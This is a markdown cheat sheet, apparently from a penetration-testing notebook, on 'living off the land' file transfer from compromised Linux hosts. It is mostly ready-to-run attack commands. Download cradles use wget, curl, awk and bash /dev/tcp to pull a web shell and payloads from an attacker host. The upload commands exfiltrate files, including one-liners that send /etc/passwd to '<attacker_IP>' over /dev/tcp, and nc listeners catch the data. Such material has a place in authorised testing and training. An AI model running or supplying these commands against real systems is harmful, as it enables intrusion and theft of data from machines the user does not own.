---
author(s):
  - Userware
tags:
  - post-exploitation
  - file-transfer-and-data-exfiltration
  - living-off-the-land
  - linux
---
# Living off the Land

> [!TIP]
> You can use pastebin sites that can be used to download cradles on the targets especially if you're transferring files in the internet. Use this to your advantage user.

## 01 - Download

### 1.1 - `wget`

#### 1.1.1 - Command

```
$ wget --no-hsts -O rsh.php http://<IP>:<PORT>/shell.php

$ wget --no-hsts --no-check-certificate https://<IP>/file.tar.gz
```

Resume partially downloaded file.

```
$ wget --no-hsts -c http://<IP>/file.tar.gz
```

Download multiple files with different URLs from a text file list.

```
$ wget --no-hsts -i urls.txt
```

#### 1.1.2 - Bash script

```bash
function bwget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}

$ bwget http://<LHOST>/<FILE>
```

### 1.2 - cURL

#### 1.2.1 - Command

```
$ curl -sO -C - http[s]://<IP>:<PORT>/payload.php

$ curl -so payload.php http:[s]//<IP>:<PORT>/payload.php

$ curl -so downloaded.tar.gz http[s]://<IP>/file.tar.gz
```

Interact with http proxy server tunnel.

```
$ curl -p -x http://<proxy_IP> http://website.com
```

#### 1.2.2 - Bash script

First variant.

```bash
function burl() {
    IFS=/ read -r proto x host query <<<"$1"
    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat ) <&3
    exec 3>&-
}

$ [PORT=<PORT>] burl http[s]://<IP>/file.txt > file.txt
```

Second variant.

```bash
function bcurl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

$ bcurl http[s]://<IP>/file.txt > file.txt
```

### 1.3 - `aria2c`

```
$ aria2c http://<IP>/file.tar.gz
```

### 1.4 - `awk`

```awk
awk 'BEGIN {
	RS = ORS = "\r\n"
	HTTPCon = "/inet/tcp/0/<attacker_IP>/<attacker_PORT>"
	print "GET /file.txt HTTP/1.1\r\nConnection: close\r\n"     |& HTTPCon
	while (HTTPCon |& getline > 0)
		print $0
	close(HTTPCon)
}'
```

## 02 - Upload

### 2.1 - `wget`

```
$ wget --no-hsts --method=PUT --post-file=file.txt http[s]://<attacker_IP>[:<PORT>]

$ sudo nc -lnvp 80
```

### 2.2 - cURL

```
$ curl -T /path/to/file.txt http[s]://<attacker_IP>[:<PORT>]
```

Upload file via POST request form.

```
$ curl -F file=@/path/to/file.txt http[s]://<attacker_IP>[:<PORT>]/post
```

Upload file via POST HTTP request.

```
$ curl -X POST -d @/path/to/file.txt http[s]://<attacker_IP>[:<PORT>]

$ sudo nc -lnvp 80 > file.txt
```

### 2.3 - Bash

```
$ bash -c 'echo -e "POST / HTTP/0.9\n\n$(< /etc/passwd)" > /dev/tcp/<attacker_IP>/<attacker_PORT>'

$ bash -c 'echo -e "POST / HTTP/1.0\n\n$(< /etc/passwd)" > /dev/tcp/<attacker_IP>/<attacker_PORT>'
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Linux/Command Execution/Wget]]

### Github

- [0xsyr0: OSCP](https://github.com/0xsyr0/OSCP)